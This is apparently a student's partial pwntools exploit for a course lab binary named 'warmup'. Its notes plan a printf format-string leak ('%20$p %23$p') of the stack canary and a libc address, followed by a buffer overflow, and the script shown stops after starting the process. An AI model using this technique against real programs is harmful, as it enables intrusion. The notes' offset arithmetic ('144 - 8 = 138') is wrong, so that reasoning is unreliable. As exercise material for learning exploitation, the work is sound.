'''
Creators:       Malachi Parks
Section:        CPEG476-010
Assignment:     PCP14: Warmup
File Description:  Using printf to leak canary then smash

Checksec info:
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Full RELRO      Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   74) Symbols       No    0               3               warmup

File info:
warmup: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=8b72f0fc93f73d288141b26ac556a79cc1c3f495, for GNU/Linux 3.2.0, not stripped

Radare2:
afl --> list all functions

Canary is always 4 or 8 bytes from bp

144 - 8 = 138 bytes to canary
138/8 = 17.25 --> canary should be at %23$p, first 7 args:
    1 = print format string
    2-7, args using in 64 bit calling convention

Leak information for printf:
https://libc.nullbyte.cat/?q=printf%3Afb0&l=libc6-x32_2.27-3ubuntu1.2_i386

Use for leak the following order:
    leak                    canary
    $20$p                   $23$p
    __libc_csu_init         last 8 bytes

    used pwndbg and counted back to $20 to figure out address leaked
'''

# Import Libarries
from pwn import *

# Variables
padding=b'a'*72     # truley 80, last 8 bytes are the canary so
padOverBP=b'c'*8    # Overwrite base pointer
leakAddrStr=b"%20$p %23$p"

# Starting ELF
print("ESTABLISHING LIBC")
libc = ELF("libc.so.6")

# Start Process
p = process("./warmup")
p.recv()
